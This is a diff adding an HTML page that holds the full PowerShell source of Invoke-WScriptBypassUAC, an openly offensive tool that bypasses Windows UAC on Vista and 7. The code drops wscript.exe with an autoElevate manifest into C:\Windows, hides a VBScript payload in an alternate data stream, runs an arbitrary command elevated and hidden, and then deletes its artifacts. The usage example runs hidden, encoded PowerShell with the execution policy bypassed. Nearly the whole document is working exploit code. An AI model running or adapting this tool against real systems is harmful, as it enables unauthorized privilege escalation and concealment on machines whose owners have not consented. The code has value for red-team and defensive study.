@@ -1,0 +1,197 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Invoke-WScriptBypassUAC</title>
+</head><body>function Invoke-WScriptBypassUAC<br/>
+{<br/>
+&nbsp; &nbsp; &lt;#<br/>
+&nbsp; &nbsp; .SYNOPSIS<br/>
+<br/>
+&nbsp; &nbsp; Performs the bypass UAC attack by abusing the lack of an embedded manifest in wscript.exe.<br/>
+<br/>
+&nbsp; &nbsp; Author: @enigma0x3, @harmj0y, Vozzie<br/>
+&nbsp; &nbsp; License: BSD 3-Clause<br/>
+&nbsp; &nbsp; Required Dependencies: None<br/>
+&nbsp; &nbsp; Optional Dependencies: None<br/>
+<br/>
+&nbsp; &nbsp; .DESCRIPTION<br/>
+<br/>
+&nbsp; &nbsp; Drops wscript.exe and a custom manifest into C:\Windows and then proceeds to execute VBScript using the wscript executable<br/>
+&nbsp; &nbsp; with the new manifest. The VBScript executed by C:\Windows\wscript.exe will run elevated.<br/>
+<br/>
+&nbsp; &nbsp; .PARAMETER payload<br/>
+&nbsp; &nbsp; The code you want wscript.exe to run elevated. Put the full command in quotes.<br/>
+<br/>
+&nbsp; &nbsp; .EXAMPLE<br/>
+&nbsp; &nbsp; Invoke-WScriptBypass -payload "powershell.exe -ep Bypass -WindowStyle Hidden -enc &lt;base64&gt;"<br/>
+<br/>
+&nbsp; &nbsp; .LINK<br/>
+&nbsp; &nbsp; http://seclist.us/uac-bypass-vulnerability-in-the-windows-script-host.html<br/>
+&nbsp; &nbsp; https://github.com/Vozzie/uacscript<br/>
+&nbsp; &nbsp; #&gt;<br/>
+<br/>
+&nbsp; &nbsp; [CmdletBinding()]<br/>
+&nbsp; &nbsp; Param(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory=$True)]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [string]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $payload<br/>
+&nbsp; &nbsp; )<br/>
+<br/>
+&nbsp; &nbsp; function Local:Get-TempFileName {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; #Generate Temporary File Name<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $sTempFolder = $env:Temp<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $sTempFolder = $sTempFolder + "\"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $sTempFileName = [System.IO.Path]::GetRandomFileName() + ".tmp"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $sTempFileName = $sTempFileName -split '\.',([regex]::matches($sTempFileName,"\.").count) -join ''<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $sTempFileNameFinal = $sTempFolder + $sTempFileName <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; return $sTempFileNameFinal<br/>
+&nbsp; &nbsp; }<br/>
+<br/>
+&nbsp; &nbsp; function Local:Invoke-CopyFile($sSource, $sTarget) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;# Cab wscript, send to temp and then extract it from temp to $env:WINDIR<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;$sTempFile = Get-TempFileName<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;Start-Process -WindowStyle Hidden -FilePath "$($env:WINDIR)\System32\makecab.exe" -ArgumentList "$sSource $sTempFile"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;$null = wusa "$sTempFile" /extract:"$sTarget" /quiet<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;# sleep for 2 seconds to allow for extraction to finish<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;Start-Sleep -s 2<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;# remove the temp files<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;Remove-Item $sTempFile<br/>
+&nbsp; &nbsp;}<br/>
+<br/>
+&nbsp; &nbsp; function Local:Invoke-WscriptTrigger {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $VBSfileName = [System.IO.Path]::GetRandomFileName() + ".vbs"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $ADSFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,"\.").count) -join ''<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $VBSPayload = "Dim objShell:"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $VBSPayload += "Dim oFso:"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $VBSPayload += "Set oFso = CreateObject(""Scripting.FileSystemObject""):"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $VBSPayload += "Set objShell = WScript.CreateObject(""WScript.Shell""):"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $VBSPayload += "command = ""$payload"":"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $VBSPayload += "objShell.Run command, 0:"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # stupid command to kick off a background cmd process to delete the wscript and manifest<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $DelCommand = "$($env:WINDIR)\System32\cmd.exe /c """"start /b """""""" cmd /c """"timeout /t 5 &gt;nul&amp;&amp;del $($env:WINDIR)\wscript.exe&amp;&amp;del $($env:WINDIR)\wscript.exe.manifest"""""""""<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $VBSPayload += "command = ""$DelCommand"":"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $VBSPayload += "objShell.Run command, 0:"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $VBSPayload += "Set objShell = Nothing"<br/>
+<br/>
+&#09;&#09;"[*] Storing VBS payload into `"$env:USERPROFILE\AppData:$ADSFile`""<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $CreateWrapperADS = {cmd /C "echo $VBSPayload &gt; ""$env:USERPROFILE\AppData:$ADSFile"""}<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Invoke-Command -ScriptBlock $CreateWrapperADS<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&#09;&#09;"[*] Executing VBS payload with modified scripting host"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $ExecuteScript = {cmd /C "$($env:WINDIR)\wscript.exe ""$env:USERPROFILE\AppData:$ADSFile"""}<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Invoke-Command -ScriptBlock $ExecuteScript<br/>
+&#09;&#09;<br/>
+&#09;&#09;"[*] Removing Alternate Data Stream from $("$env:USERPROFILE\AppData:$ADSFile")"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Remove-ADS $env:USERPROFILE\AppData:$ADSFile<br/>
+&nbsp; &nbsp; }<br/>
+<br/>
+&nbsp; &nbsp; function Local:Invoke-WscriptElevate {<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $WscriptManifest =<br/>
+@"<br/>
+&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;<br/>
+&lt;assembly xmlns="urn:schemas-microsoft-com:asm.v1"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; manifestVersion="1.0"&gt;<br/>
+&nbsp; &lt;asmv3:trustInfo&gt;<br/>
+&nbsp; &nbsp; &lt;security&gt;<br/>
+&nbsp; &nbsp; &nbsp; &lt;requestedPrivileges&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &lt;requestedExecutionLevel level="RequireAdministrator" uiAccess="false"/&gt;<br/>
+&nbsp; &nbsp; &nbsp; &lt;/requestedPrivileges&gt;<br/>
+&nbsp; &nbsp; &lt;/security&gt;<br/>
+&nbsp; &lt;/asmv3:trustInfo&gt;<br/>
+&nbsp; &lt;asmv3:application&gt;<br/>
+&nbsp; &nbsp; &lt;asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings"&gt;<br/>
+&nbsp; &nbsp; &nbsp; &lt;autoElevate&gt;true&lt;/autoElevate&gt;<br/>
+&nbsp; &nbsp; &nbsp; &lt;dpiAware&gt;true&lt;/dpiAware&gt;<br/>
+&nbsp; &nbsp; &lt;/asmv3:windowsSettings&gt;<br/>
+&nbsp; &lt;/asmv3:application&gt;<br/>
+&lt;/assembly&gt;<br/>
+"@<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # Copy and apply manifest to wscript.exe<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $sManifest = $env:Temp + "\wscript.exe.manifest"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $WscriptManifest | Out-File $sManifest -Encoding UTF8<br/>
+&#09;&#09;<br/>
+&#09;&#09;"[*] Cabbing and extracting manifest into $($env:WINDIR)"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Invoke-CopyFile $sManifest $env:WINDIR<br/>
+<br/>
+&#09;&#09;"[*] Cabbing and extracting wscript.exe into $($env:WINDIR)"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $WScriptPath = "$($env:WINDIR)\System32\wscript.exe"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Invoke-CopyFile $WScriptPath $env:WINDIR<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Remove-Item -Force $sManifest<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # execute the payload<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Invoke-WscriptTrigger<br/>
+&nbsp; &nbsp; }<br/>
+<br/>
+&nbsp; &nbsp; function Local:Remove-ADS {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &lt;#<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; .SYNOPSIS<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Removes an alterate data stream from a specified location.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; P/Invoke code adapted from PowerSploit's Mayhem.psm1 module.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Author: @harmj0y, @mattifestation<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; License: BSD 3-Clause<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; .LINK<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; #&gt;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; [CmdletBinding()] Param(<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory=$True)]<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [string]$ADSPath<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; )<br/>
+&nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; #region define P/Invoke types dynamically<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # &nbsp; stolen from PowerSploit https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)<br/>
+&nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; @('kernel32.dll'),<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [Reflection.FieldInfo[]]@($SetLastError),<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; @($True))<br/>
+&nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # Define [Win32.Kernel32]::DeleteFile<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('DeleteFile',<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 'kernel32.dll',<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [Reflection.CallingConventions]::Standard,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [Bool],<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [Type[]]@([String]),<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [Runtime.InteropServices.CallingConvention]::Winapi,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [Runtime.InteropServices.CharSet]::Ansi)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $Kernel32 = $TypeBuilder.CreateType()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; $Result = $Kernel32::DeleteFile($ADSPath)<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if ($Result){<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Alternate Data Stream at $ADSPath successfully removed."<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; else{<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Verbose "Alternate Data Stream at $ADSPath removal failure!"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; }<br/>
+<br/>
+&nbsp; &nbsp; #make sure we are running on vulnerable windows version (vista,7)<br/>
+&nbsp; &nbsp; $OSVersion = [Environment]::OSVersion.Version<br/>
+&nbsp; &nbsp; if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2))){<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if(([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") -eq $True){<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Write-Warning "[!] You are already elevated!"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; else {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Invoke-WscriptElevate<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; }else{Write-Warning "[!] Target Not Vulnerable"}<br/>
+}<br/>
+</body></html>
